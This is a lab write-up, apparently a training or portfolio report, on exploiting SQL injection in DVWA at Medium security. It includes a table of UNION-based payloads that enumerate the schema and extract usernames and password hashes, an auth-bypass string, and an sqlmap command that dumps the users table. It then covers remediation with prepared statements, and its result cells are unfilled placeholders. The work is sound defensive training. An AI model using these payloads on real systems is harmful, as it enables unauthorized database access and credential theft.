# SQL Injection Exploitation — DVWA (Medium Security)

**Author:** Christiana (CeaVault)
**Environment:** DVWA on Kali Linux (local, Docker), security level: Medium
**Tools used:** Burp Suite, Linux terminal / curl, sqlmap (bonus)
**Related work:** Extends [Task 3 — Beginner SQL Injection (Low security)](../task-3/)

---

## Executive Summary (Non-Technical)

During this assessment, I identified a **SQL Injection vulnerability** in a
web application's "SQL Injection" feature, even after the application's
built-in input filtering (Medium security level) was enabled. The
vulnerability allowed an attacker to:

- Read the internal structure of the application's database (table and
  column names) without any special privileges
- Extract every username and password hash stored in the user database
- Do this even though the application attempted to sanitize user input

**Business impact:** In a real production system, this class of
vulnerability routinely leads to full customer database breaches —
including credentials, personal data, and payment information — and is
consistently ranked the **#1 or #2 most critical web application risk**
by OWASP. It typically requires no authentication, no specialized tools
(a web browser is enough), and can be automated, meaning a single
unpatched input field can compromise an entire application.

**Risk rating: Critical (CVSS ~9.1 / High-Critical band)** — high impact
(full data exposure), low attacker effort, no privileges required.

**Recommended action:** Immediate remediation via parameterized queries
(see Remediation section below) before any production deployment; this is
a one-line-per-query class of fix with no functional trade-off.

---

## Scope & Environment

| Item | Detail |
|---|---|
| Target | DVWA `vulnerabilities/sqli/` module |
| Security level | Medium (input passed through `mysqli_real_escape_string()`) |
| Access level | Authenticated low-privilege DVWA user |
| Testing type | Local, authorized, self-hosted lab (Docker) |

---

## Methodology

1. Confirmed the injection point and column count using `ORDER BY`
   probing.
2. Confirmed UNION-based injection was viable and controlled which
   columns were reflected on the page.
3. Used `UNION SELECT` against `information_schema` to enumerate the
   database name, table names, and column names — without any prior
   knowledge of the schema.
4. Extracted the full `users` table (usernames + password hashes).
5. Intercepted and modified the underlying HTTP request in Burp Suite to
   bypass the client-side dropdown restriction that Medium security
   introduces.
6. Cross-checked manual findings against `sqlmap`'s automated results.

---

## Manual Injection Findings

> Fill in the "Output returned" column with your actual results after
> running `sql_injection_exploit.sh` / testing through Burp — this table
> is the evidentiary core of the report.

| # | Purpose | Payload (in `id` field) | Output returned |
|---|---|---|---|
| 1 | Determine column count | `1 ORDER BY 3 -- -` | `[FILL IN: e.g. "Unknown column '3' in 'order clause'"]` |
| 2 | Confirm UNION works | `1 UNION SELECT 'a','b' -- -` | `[FILL IN]` |
| 3 | Fingerprint DB | `1 UNION SELECT database(), version() -- -` | `[FILL IN: db name + MySQL version]` |
| 4 | Enumerate tables | `1 UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() -- -` | `[FILL IN: list of tables, e.g. users, guestbook]` |
| 5 | Enumerate columns | `1 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' -- -` | `[FILL IN: user_id, first_name, last_name, user, password, avatar...]` |
| 6 | Extract credentials | `1 UNION SELECT user, password FROM users -- -` | `[FILL IN: usernames + MD5 hashes]` |

**Why Medium's filtering didn't stop this:** `mysqli_real_escape_string()`
only escapes special characters inside string literals (like quotes).
Because the vulnerable query uses the `id` parameter directly in a numeric
context (`WHERE user_id = $id`, no surrounding quotes), there's nothing to
escape — the filter never gets a chance to act on the malicious input.

**Auth-bypass payload (concept demonstration):**
Username field: `admin' -- -`
This comments out the rest of the query (including the password check),
so a login query shaped like
`SELECT * FROM users WHERE username='$u' AND password='$p'` authenticates
as `admin` with no valid password. *(Note: DVWA's own login form does not
build a raw query this way, so this is documented as a concept
reference/standalone PoC rather than a live finding against DVWA's login.)*

---

## Burp Suite Evidence

`[FILL IN: insert screenshot of the intercepted POST request in Burp's
Proxy/Repeater tab here, e.g. sql_injection_burp_request.png]`

Caption should note: the `id` field was edited directly in Burp,
bypassing the dropdown the UI otherwise restricts you to at Medium
security — demonstrating that client-side restrictions provide no real
protection.

---

## sqlmap Comparison (Bonus)

Command used:
```
sqlmap -u "http://localhost/vulnerabilities/sqli/" \
  --data="id=1&Submit=Submit" \
  --cookie="PHPSESSID=<session_id>; security=medium" \
  --dbms=mysql --level=3 --risk=2 \
  --batch --dump -T users -D dvwa
```

`[FILL IN: paste key excerpts of sqlmap's output — confirmed injection
type, DBMS fingerprint, dumped table]`

**Comparison notes:** `[FILL IN — e.g. sqlmap confirmed the same UNION-based
vector automatically and dumped the same table in under a minute, but the
manual approach demonstrates understanding of *why* the payloads work,
which sqlmap's output alone doesn't show]`

---

## Remediation

### Why this vulnerability exists

The application builds SQL queries by directly concatenating user input
into the query string, e.g.:

```php
$id = $_REQUEST['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id";
```

Even with `mysqli_real_escape_string()` applied, the input is still
inserted into the query as raw SQL — the database engine can't tell the
difference between "data" and "code" because they're mixed together in
the same string. Escaping quote characters only helps when the injected
value sits inside a quoted string literal; it does nothing when the value
is used directly in a numeric context, and more broadly it's a blocklist
approach that is easy to bypass with encoding tricks, comments, or
alternate injection techniques.

**The correct fix is not better escaping — it's separating code from
data entirely**, using parameterized queries (prepared statements). The
database driver sends the query structure and the user-supplied values
as two separate channels, so user input can never be interpreted as SQL
syntax, no matter what it contains.

### Fix — PHP (using `mysqli` prepared statements)

```php
<?php
// Vulnerable version:
// $id = $_REQUEST['id'];
// $query = "SELECT first_name, last_name FROM users WHERE user_id = $id";
// $result = mysqli_query($conn, $query);

// Fixed version — parameterized query:
$id = $_REQUEST['id'];

$stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->bind_param("i", $id);   // "i" = bind $id as an integer
$stmt->execute();
$result = $stmt->get_result();

while ($row = $result->fetch_assoc()) {
    echo $row['first_name'] . " " . $row['last_name'];
}
$stmt->close();
?>
```

### Fix — Python (using parameterized queries, e.g. with `pymysql`)

```python
import pymysql

conn = pymysql.connect(host="localhost", user="app_user",
                        password="...", database="dvwa")
cursor = conn.cursor()

# Vulnerable version (never do this):
# query = f"SELECT first_name, last_name FROM users WHERE user_id = {id}"
# cursor.execute(query)

# Fixed version — parameterized query:
id = request.args.get("id")
cursor.execute(
    "SELECT first_name, last_name FROM users WHERE user_id = %s",
    (id,)
)
row = cursor.fetchone()
print(row)
```

### Additional defense-in-depth recommendations

- **Input validation**: enforce that `id` is a valid integer before it
  ever reaches the query (e.g. `filter_var($id, FILTER_VALIDATE_INT)` in
  PHP), as a second layer, not a replacement for parameterization.
- **Least privilege**: the database account used by the web app should
  not have access to `information_schema` details or other databases it
  doesn't need — limiting the blast radius even if a query is compromised.
- **Password hashing**: this dataset used unsalted MD5 hashes, which are
  fast to crack offline; use `bcrypt`/`argon2` for password storage
  regardless of the injection fix.
- **WAF as a stopgap only**: a web application firewall can reduce risk
  while a fix is deployed, but should never be treated as the actual fix.

---

## Conclusion

This exercise demonstrates that surface-level input filtering (escaping
special characters) is insufficient protection against SQL injection when
user input is concatenated directly into queries. The only reliable fix
is parameterized queries / prepared statements, which should be the
default pattern for all database access in the application, not an
exception applied only where a vulnerability was found.
